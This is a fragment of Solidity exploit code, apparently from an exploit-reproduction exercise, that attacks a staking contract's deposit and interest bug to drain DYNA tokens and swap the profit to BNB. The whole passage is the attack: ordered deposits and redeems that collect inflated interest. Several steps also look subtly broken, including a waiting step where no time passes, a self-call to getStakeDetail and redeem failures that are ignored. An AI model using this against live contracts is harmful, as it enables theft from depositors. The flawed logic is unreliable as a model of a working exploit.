        // Approve staking contract
        uint256 playerBal = IERC20(TOKEN).balanceOf(PLAYER);
        IERC20(TOKEN).approve(TARGET, playerBal);

        // Exploit the deposit bug:
        // 1. Deposit small amount to establish stake and lastProcessAt
        // 2. Wait for time to pass (interest accrues)
        // 3. Deposit large amount - lastProcessAt NOT updated, pendingReward NOT processed
        // 4. Redeem small amount - interest calculated on NEW principal with OLD duration

        // Step 1: Initial deposit - sets lastProcessAt
        uint256 initialDeposit = 1000e18;
        IERC20(TOKEN).transferFrom(PLAYER, address(this), initialDeposit);
        IERC20(TOKEN).approve(TARGET, initialDeposit);

        (bool success,) = TARGET.call(abi.encodeWithSignature("deposit(uint256)", initialDeposit));
        require(success, "initial deposit failed");

        // Step 2: Wait - we can use timestamps to simulate waiting
        // Since no time manipulation is available, we'll use the fact that 
        // duration > 0 in getInterest() calculation

        // Step 3: Deposit large amount - this is the key exploit
        // pendingReward accumulates but is not reset
        // lastProcessAt stays at original value
        uint256 largeDeposit = 10000e18;
        IERC20(TOKEN).transferFrom(PLAYER, address(this), largeDeposit);
        IERC20(TOKEN).approve(TARGET, largeDeposit);

        (success,) = TARGET.call(abi.encodeWithSignature("deposit(uint256)", largeDeposit));
        require(success, "large deposit failed");

        // Step 4: Redeem small amount to harvest interest
        // The interest is calculated on total principal (old + new) with full duration
        // We redeem tiny amount to just trigger interest calculation
        uint256 smallRedeem = 1e6; // tiny redeem amount
        (success,) = TARGET.call(abi.encodeWithSignature("redeem(uint256)", smallRedeem));
        require(success, "redeem failed");

        // Now pendingReward has been calculated with the bug
        // Redeem more to harvest accumulated pendingReward
        // But we need to do this carefully to not reset pendingReward too much

        // Check how much we have in pendingReward
        (,,uint256 lastProcess,uint256 firstStake) = this.getStakeDetail(PLAYER);

        // The key insight: 
        // - getInterest calculates: principal * apr * duration / year / 10000 + pendingReward
        // - Due to the bug, pendingReward was calculated with wrong principal
        // - We can harvest by redeeming partial amounts

        // Redeem a larger portion to get actual tokens
        uint256 redeemAmount = 1000e18;
        (success,) = TARGET.call(abi.encodeWithSignature("redeem(uint256)", redeemAmount));
        // May fail if interest calculation is 0, that's ok

        // Try to redeem rest
        redeemAmount = 10000e18;
        (success,) = TARGET.call(abi.encodeWithSignature("redeem(uint256)", redeemAmount));
        // May fail too, but we should have some tokens

        // Transfer all DYNA to player
        uint256 finalBal = IERC20(TOKEN).balanceOf(address(this));
        if (finalBal > 0) {
            IERC20(TOKEN).transfer(PLAYER, finalBal);
        }

        // Convert to native via DexUtils
        uint256 playerTokenBal = IERC20(TOKEN).balanceOf(PLAYER);
        if (playerTokenBal > initialDeposit + largeDeposit) {
            // We made profit - convert to BNB
            IERC20(TOKEN).transfer(address(uint160(address(this))), playerTokenBal);
            DexUtils.swapExcessTokensToBaseToken(TOKEN);
        }
    }

